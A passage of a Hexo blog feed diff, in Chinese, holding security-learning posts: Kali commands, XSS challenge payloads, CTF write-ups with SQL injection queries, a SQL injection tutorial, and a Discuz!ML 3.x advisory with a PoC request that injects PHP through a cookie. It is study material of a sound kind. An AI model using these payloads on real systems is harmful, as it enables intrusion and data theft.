&amp;#x2F;etc&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;src&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp redis-server &amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp redis-cli &amp;#x2F;use&amp;#x2F;bin&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd ..&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;vim &amp;#x2F;etc&amp;#x2F;redis.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;redis-server &amp;#x2F;etc&amp;#x2F;redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+      <category term="Redis" scheme="http://yoursite.com/categories/Redis/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>kali常见指令</title>
+    <link href="http://yoursite.com/2021/03/29/kali%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/"/>
+    <id>http://yoursite.com/2021/03/29/kali常见指令/</id>
+    <published>2021-03-29T13:47:00.000Z</published>
+    <updated>2021-03-29T14:02:35.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="KALI常见指令"><a href="#KALI常见指令" class="headerlink" title="#KALI常见指令"></a>#KALI常见指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ps aux &#x2F;&#x2F;查看进程</span><br><span class="line">ps aux|grep [nginx] &#x2F;&#x2F;查看nginx进程</span><br><span class="line">ps -u [root] &#x2F;&#x2F;查看root用户进程</span><br><span class="line">#案例</span><br><span class="line">ps aux|grep 30504</span><br><span class="line">ls -lh &#x2F;proc&#x2F;30504</span><br><span class="line">top &#x2F;&#x2F;查看实时进程 P:以cup占用降序排序 M：以内存占用降序排序 C:完整命令内容</span><br><span class="line">netstat -anp &#x2F;&#x2F;端口占用信息</span><br><span class="line">netstat -anpt &#x2F;&#x2F;只查看tcp端口信息</span><br><span class="line">uname -a &#x2F;&#x2F;查看当前操作的Linux内核</span><br><span class="line">lsb_release -a &#x2F;&#x2F;查看发行版本</span><br><span class="line">cat head tail &#x2F;&#x2F;查看文件全部&amp;头部&amp;尾部 -n参数指定输出行数</span><br><span class="line">tail -f auth.log &#x2F;&#x2F;实时地输出最新的日志</span><br><span class="line">ls &#x2F;var&#x2F;log &#x2F;&#x2F;查看日志目录</span><br><span class="line">crontab -l &#x2F;&#x2F;列表系统的计划任务</span><br><span class="line">crontab -e &#x2F;&#x2F;进入编辑模式</span><br><span class="line">crontab -u root -e &#x2F;&#x2F;查看特定用户的计划任务</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;[root] &#x2F;&#x2F;查看不同用户的计划任务</span><br><span class="line">history &#x2F;&#x2F;历史命令操作记录</span><br><span class="line">cat ~&#x2F;.bash_history &#x2F;&#x2F;查看命令操作历史                                      </span><br><span class="line">lastlog &#x2F;&#x2F;最后登录信息</span><br><span class="line">*last -f&#x2F;var&#x2F;log&#x2F;wtmp &#x2F;&#x2F;历史用户登录信息</span><br><span class="line">find . -name &quot;*.txt&quot; &#x2F;&#x2F;当前目录查找txt文件</span><br><span class="line"></span><br><span class="line">#查找时间范围内修改文件</span><br><span class="line">touch -t time1 t_start &#x2F;&#x2F;touch：生成空文件</span><br><span class="line">touch -t time2 t_end</span><br><span class="line">find . -type f -newer t_start ! -newer t_end &#x2F;&#x2F;查找时间段内修改的文件</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="KALI部署网站"><a href="#KALI部署网站" class="headerlink" title="#KALI部署网站"></a>#KALI部署网站</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#目录信息：</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;             配置文件夹</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;        默认显示页面路径</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;nginx&#x2F;            模块依赖路径</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;nginx&#x2F;        可执行文件</span><br><span class="line"></span><br><span class="line">#操作命令</span><br><span class="line">php -v &#x2F;&#x2F;返回php版本7.4.15</span><br><span class="line">apt install php7.4-fpm</span><br><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-267.png" alt="upload successful"><br><img src="/images/pasted-268.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">vim 1.php</span><br><span class="line">&lt;?PHP phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>访问127.0.0.1/1.php<br><img src="/images/pasted-269.png" alt="upload successful"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;KALI常见指令&quot;&gt;&lt;a href=&quot;#KALI常见指令&quot; class=&quot;headerlink&quot; title=&quot;#KALI常见指令&quot;&gt;&lt;/a&gt;#KALI常见指令&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ps aux &amp;#x2F;&amp;#x2F;查看进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ps aux|grep [nginx] &amp;#x2F;&amp;#x2F;查看nginx进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ps -u [root] &amp;#x2F;&amp;#x2F;查看root用户进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#案例&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ps aux|grep 30504&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ls -lh &amp;#x2F;proc&amp;#x2F;30504&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;top &amp;#x2F;&amp;#x2F;查看实时进程 P:以cup占用降序排序 M：以内存占用降序排序 C:完整命令内容&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;netstat -anp &amp;#x2F;&amp;#x2F;端口占用信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;netstat -anpt &amp;#x2F;&amp;#x2F;只查看tcp端口信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;uname -a &amp;#x2F;&amp;#x2F;查看当前操作的Linux内核&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lsb_release -a &amp;#x2F;&amp;#x2F;查看发行版本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat head tail &amp;#x2F;&amp;#x2F;查看文件全部&amp;amp;头部&amp;amp;尾部 -n参数指定输出行数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tail -f auth.log &amp;#x2F;&amp;#x2F;实时地输出最新的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ls &amp;#x2F;var&amp;#x2F;log &amp;#x2F;&amp;#x2F;查看日志目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crontab -l &amp;#x2F;&amp;#x2F;列表系统的计划任务&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crontab -e &amp;#x2F;&amp;#x2F;进入编辑模式&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crontab -u root -e &amp;#x2F;&amp;#x2F;查看特定用户的计划任务&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat &amp;#x2F;var&amp;#x2F;spool&amp;#x2F;cron&amp;#x2F;crontabs&amp;#x2F;[root] &amp;#x2F;&amp;#x2F;查看不同用户的计划任务&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;history &amp;#x2F;&amp;#x2F;历史命令操作记录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat ~&amp;#x2F;.bash_history &amp;#x2F;&amp;#x2F;查看命令操作历史                                      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lastlog &amp;#x2F;&amp;#x2F;最后登录信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*last -f&amp;#x2F;var&amp;#x2F;log&amp;#x2F;wtmp &amp;#x2F;&amp;#x2F;历史用户登录信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find . -name &amp;quot;*.txt&amp;quot; &amp;#x2F;&amp;#x2F;当前目录查找txt文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#查找时间范围内修改文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;touch -t time1 t_start &amp;#x2F;&amp;#x2F;touch：生成空文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;touch -t time2 t_end&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find . -type f -newer t_start ! -newer t_end &amp;#x2F;&amp;#x2F;查找时间段内修改的文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+      <category term="Kali" scheme="http://yoursite.com/categories/Kali/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>XSS-challenge-tour</title>
+    <link href="http://yoursite.com/2021/02/11/XSS-challenge-tour/"/>
+    <id>http://yoursite.com/2021/02/11/XSS-challenge-tour/</id>
+    <published>2021-02-11T03:56:00.000Z</published>
+    <updated>2021-03-29T13:54:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="#level1"></a>#level1</h3><p><img src="/images/pasted-256.png" alt="upload successful"><br>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h3 id="level2"><a href="#level2" class="headerlink" title="#level2"></a>#level2</h3><p><img src="/images/pasted-257.png" alt="upload successful"><br>payload:<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><a id="more"></a><h3 id="level3"><a href="#level3" class="headerlink" title="#level3"></a>#level3</h3><p><img src="/images/pasted-258.png" alt="upload successful"><br>payload:<code>&#39; onmouseover=&#39;alert(1)</code></p><h3 id="level4"><a href="#level4" class="headerlink" title="#level4"></a>#level4</h3><p><img src="/images/pasted-259.png" alt="upload successful"><br>payload:<code>&quot;onmouseover=&quot;alert(1)</code></p><h3 id="level5"><a href="#level5" class="headerlink" title="#level5"></a>#level5</h3><p><img src="/images/pasted-260.png" alt="upload successful"><br>payload:<code>xxx&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;</code></p><h3 id="level6"><a href="#level6" class="headerlink" title="#level6"></a>#level6</h3><p><img src="/images/pasted-261.png" alt="upload successful"><br>payload:<code>111&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p><h3 id="level7"><a href="#level7" class="headerlink" title="#level7"></a>#level7</h3><p><img src="/images/pasted-263.png" alt="upload successful"><br>payload:<code>xx&quot; oonnmouseover=&quot;alert(1)</code></p><h3 id="level8"><a href="#level8" class="headerlink" title="#level8"></a>#level8</h3><p><img src="/images/pasted-264.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p><h3 id="level9"><a href="#level9" class="headerlink" title="#level9"></a>#level9</h3><p><img src="/images/pasted-265.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p><h3 id="level10"><a href="#level10" class="headerlink" title="#level10"></a>#level10</h3><p><img src="/images/pasted-266.png" alt="upload successful"><br>payload:<code>?t_sort=&quot; onclick=&quot;alert(1)&quot; type=</code></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;level1&quot;&gt;&lt;a href=&quot;#level1&quot; class=&quot;headerlink&quot; title=&quot;#level1&quot;&gt;&lt;/a&gt;#level1&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-256.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;payload:&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&quot;level2&quot;&gt;&lt;a href=&quot;#level2&quot; class=&quot;headerlink&quot; title=&quot;#level2&quot;&gt;&lt;/a&gt;#level2&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-257.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;payload:&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Ctfhub-wp</title>
+    <link href="http://yoursite.com/2021/01/30/Github-wp/"/>
+    <id>http://yoursite.com/2021/01/30/Github-wp/</id>
+    <published>2021-01-30T11:09:00.000Z</published>
+    <updated>2021-01-31T03:09:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="常见的搜集"><a href="#常见的搜集" class="headerlink" title="#常见的搜集"></a>#常见的搜集</h3><p>1.查看泄漏目录<code>python3 dirsearch.py -u http://challenge-ff56d3fec964fb86.sandbox.ctfhub.com:10080/</code><br><img src="/images/pasted-237.png" alt="upload successful"></p><a id="more"></a><p>2.robots.txt<br><img src="/images/pasted-238.png" alt="upload successful"><br>flag1_is_her3_fun.txt<br><img src="/images/pasted-239.png" alt="upload successful"><br>3.index.php~<br><img src="/images/pasted-240.png" alt="upload successful"><br>4..index.php.swp<br><code>cat index.php.swp</code><br><img src="/images/pasted-241.png" alt="upload successful"><br>flag:n1book{info_1s_v3ry_imp0rtant_hack}</p><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="#粗心的小李"></a>#粗心的小李</h3><p>1.<code>./scrabble  http://challenge-d044af84600c5d27.sandbox.ctfhub.com:10080/</code><br><img src="/images/pasted-242.png" alt="upload successful"></p><h3 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="#SQL注入-1"></a>#SQL注入-1</h3><p>1.<code>index.php?id=-1&#39;union select 1,2,3%23</code><br><img src="/images/pasted-246.png" alt="upload successful"><br>2.<code>index.php?id=-1&#39;union select 1,database(),3%23</code><br><img src="/images/pasted-247.png" alt="upload successful"><br>3.<code>index.php?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;note&#39;%23</code><br><img src="/images/pasted-245.png" alt="upload successful"><br>4.<code>index.php?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;note&#39; and table_name=&#39;fl4g&#39;%23</code><br><img src="/images/pasted-248.png" alt="upload successful"><br>5.<code>index.php?id=-1&#39;union select 1,fllllag,3 from note.fl4g%23</code><br><img src="/images/pasted-249.png" alt="upload successful"><br>flag:n1book{union_select_is_so_cool}</p><h3 id="SQL注入-2"><a href="#SQL注入-2" class="headerlink" title="#SQL注入-2"></a>#SQL注入-2</h3><p>1.输入URL：<code>login.php?tips=1</code> 在输入框输入数据并抓包<br><img src="/images/pasted-250.png" alt="upload successful"><br>2.<code>name=1111&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=database()),0x7e),1)#&amp;pass=1111</code><br><img src="/images/pasted-251.png" alt="upload successful"><br>3.<code>name=1111&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(column_name))from information_schema.columns where table_schema=database() and table_name=&#39;fl4g&#39;),0x7e),1)#&amp;pass=1111</code><br><img src="/images/pasted-252.png" alt="upload successful"><br>4.<code>name=1111&#39;and updatexml(1,concat(0x7e,(selselectect(flag) from fl4g),0x7e),1)#&amp;pass=1111</code><br><img src="/images/pasted-253.png" alt="upload successful"><br>flag:n1book{login_sqli_is_nice}</p><h3 id="arf-1"><a href="#arf-1" class="headerlink" title="#arf-1"></a>#arf-1</h3><p>1.<code>?p=php://filter/read=convert.base64-encode/resource=flag</code><br><img src="/images/pasted-254.png" alt="upload successful"><br>2.base64解码<br>flag:n1book{afr_1_solved}</p><h3 id="arf-2"><a href="#arf-2" class="headerlink" title="#arf-2"></a>#arf-2</h3><p>1.<code>http://challenge-5f90db2d4f54200e.sandbox.ctfhub.com:10080/img../</code><br><img src="/images/pasted-255.png" alt="upload successful"><br>flag:n1book{afr_2_solved}</p><h3 id="arf-3"><a href="#arf-3" class="headerlink" title="#arf-3"></a>#arf-3</h3>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;常见的搜集&quot;&gt;&lt;a href=&quot;#常见的搜集&quot; class=&quot;headerlink&quot; title=&quot;#常见的搜集&quot;&gt;&lt;/a&gt;#常见的搜集&lt;/h3&gt;&lt;p&gt;1.查看泄漏目录&lt;code&gt;python3 dirsearch.py -u http://challenge-ff56d3fec964fb86.sandbox.ctfhub.com:10080/&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;/images/pasted-237.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>SQL注入</title>
+    <link href="http://yoursite.com/2020/02/04/SQL%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2020/02/04/SQL注入/</id>
+    <published>2020-02-04T05:21:00.000Z</published>
+    <updated>2021-01-30T12:57:27.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="判断存在注入"><a href="#判断存在注入" class="headerlink" title="#判断存在注入"></a>#判断存在注入</h3><p>1.访问<code>id=1</code><br>2.访问<code>id=1</code>‘，返回内容与1不同<br>3.访问<code>id=1 and 1=1</code>，返回内容与1相同<br>4.访问<code>id=1 and 1=2</code>，返回内容与1不同<br>=》判断存在注入</p><a id="more"></a><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="#寻找注入点"></a>#寻找注入点</h3><p>5.访问<code>id=1 order by 1(1-99)</code>,直到返回内容与1不同（例：字段数为3）<br>6.访问<code>id=1 union select 1,2,3</code>，返回内容与1相同（代码只返回第一条结果）<br>7.访问<code>id=-1 union select 1,2,3</code>，返回union select结果（例：返回2:3，即2，3间可插入mysql语句）<br>###<br>#库表字段（需记忆）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">库：information_schema</span><br><span class="line">表：SCHEMATA-&gt;SCHEMA_NAME（对应字段）</span><br><span class="line">TABLES-&gt;TABLE_SCHEMA,TABLE_NAME</span><br><span class="line">    COLUMNS-&gt;TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME</span><br><span class="line">SQL格式：union select 查询字段名 from 库.表 where 已知条件字段名&#x3D;‘已知条件的值’</span><br></pre></td></tr></table></figure><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="#爆数据库名"></a>#爆数据库名</h3><p>8.访问<code>id=-1 union select 1,database(),3</code>（例：返回sql）</p><h3 id="爆数据表名"><a href="#爆数据表名" class="headerlink" title="#爆数据表名"></a>#爆数据表名</h3><p>9.访问<code>id=-1 union select 1,(select table_name from information_schema.table where table_schema=&#39;sql&#39; limit 0,1),3</code>（例：返回email，调试[limit1,1]返回referers)</p><h3 id="爆字段名"><a href="#爆字段名" class="headerlink" title="#爆字段名"></a>#爆字段名</h3><p>10.访问<code>id=-1 union select 1,(select column_name from information_schema.columns from where table_schema=&#39;sql&#39; and table_name=&#39;emails&#39; limit 0,1),3</code>（例：返回id)</p><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="#爆数据"></a>#爆数据</h3><p>11.访问<code>id=-1 union select 1,(select id from sql.email limit 0,1),3</code></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;判断存在注入&quot;&gt;&lt;a href=&quot;#判断存在注入&quot; class=&quot;headerlink&quot; title=&quot;#判断存在注入&quot;&gt;&lt;/a&gt;#判断存在注入&lt;/h3&gt;&lt;p&gt;1.访问&lt;code&gt;id=1&lt;/code&gt;&lt;br&gt;2.访问&lt;code&gt;id=1&lt;/code&gt;‘，返回内容与1不同&lt;br&gt;3.访问&lt;code&gt;id=1 and 1=1&lt;/code&gt;，返回内容与1相同&lt;br&gt;4.访问&lt;code&gt;id=1 and 1=2&lt;/code&gt;，返回内容与1不同&lt;br&gt;=》判断存在注入&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Discuz!ML 3.x任意代码执行漏洞</title>
+    <link href="http://yoursite.com/2020/02/04/Discuz-ML-3-x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2020/02/04/Discuz-ML-3-x任意代码执行漏洞/</id>
+    <published>2020-02-04T05:10:00.000Z</published>
+    <updated>2020-02-04T09:27:42.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞综述"><a href="#漏洞综述" class="headerlink" title="#漏洞综述"></a>#漏洞综述</h3><p>漏洞类型：代码执行漏洞<br>影响系统及版本：Discuz!ML V3.2-3.4<br>漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。</p><a id="more"></a><h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="#漏洞poc"></a>#漏洞poc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Discuz&#x2F;upload&#x2F;forum.php HTTP &#x2F; 1.1 </span><br><span class="line">主机：169.254.183.180 </span><br><span class="line">User-Agent：Mozilla &#x2F; 5.0（Windows NT 10.0; Win64; x64; rv：68.0）Gecko &#x2F; 20100101 Firefox &#x2F; 68.0 </span><br><span class="line">接受：text &#x2F; html，application &#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8 </span><br><span class="line">Accept-Language：zh-CN，zh; q &#x3D; 0.8，zh-TW; q &#x3D; 0.7，zh-HK; q &#x3D; 0.5， en-US; q &#x3D; 0.3，en; q &#x3D; 0.2 </span><br><span class="line">Accept-Encoding：gzip，deflate </span><br><span class="line">Connection：close </span><br><span class="line">Cookie：lpAo_2132_saltkey &#x3D; gJ6FRwO6; lpAo_2132_language &#x3D; en&#39;.phpinfo（）&#39;。lpAo_2132_lastvisit &#x3D; 1563156484; lpAo_2132_sid &#x3D; G5YO6z; lpAo_2132_lastact &#x3D; 1563160086％09home.php％09misc; lpAo_2132_onlineusernum &#x3D; 1; lpAo_2132_sendmail &#x3D; 1 </span><br><span class="line">升级 - 不安全请求：1 </span><br><span class="line">缓存控制：max-age &#x3D; 0</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h3><p>1.在PoC的代码中填充’.1.’使得代码出错，定位出错代码文件：<br><img src="/images/pasted-225.png" alt="upload successful"><br><img src="/images/pasted-215.png" alt="upload successful"><br>2.报错点1:portal.php 第35行，<br><img src="/images/pasted-216.png" alt="upload successful"><br><img src="/images/pasted-217.png" alt="upload successful"><br>紧接着定位libfile函数，文件加载路径函数（command+B）。该函数读取source目录下的$folder子目录作为基础部分。<br><img src="/images/pasted-218.png" alt="upload successful"><br>该函数读取source目录下的$folder子目录作为基础部分，realpath函数为返回绝对路径函数，DISCUZ_ROOT为定义网站根目录的常量。<br>=&gt;原因是系统因为找不到一个php文件而报的错。<br>3.报错2:<code>source/moudle/portal_index.php</code> 第32行<br><img src="/images/pasted-219.png" alt="upload successful"><br><img src="/images/pasted-220.png" alt="upload successful"><br>定位template函数，文件加载路径函数<code>/source/function/function_core.php</code>（command+B）。该函数作用也是调用模版。<br><img src="/images/pasted-221.png" alt="upload successful"><br>程序将缓存文件写在了<code>/data/template/</code>目录下，文件名由DISCUZ_LANG等多个变量组成，追溯DISCUZ_LANG的输入为<code>$_config[&#39;output&#39;][&#39;language&#39;]</code><br><img src="/images/pasted-222.png" alt="upload successful"><br>继续跟进该值（command+shift+F)<br><img src="/images/pasted-223.png" alt="upload successful"><br>=&gt;DISCUZ_LANG值为Cookie中获取到的language（$lng），未设置过滤<br><img src="/images/pasted-224.png" alt="upload successful"><br>4.总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.从cookie中获取了language的值(可控）</span><br><span class="line">2.language值赋给$lng</span><br><span class="line">3.$lng值赋给DISCUZ_LANG</span><br><span class="line">4.系统通过template函数调用模板文件</span><br><span class="line">5.template函数执行，执行到$cachefile的时候，执行构造的代码</span><br></pre></td></tr></table></figure><h3 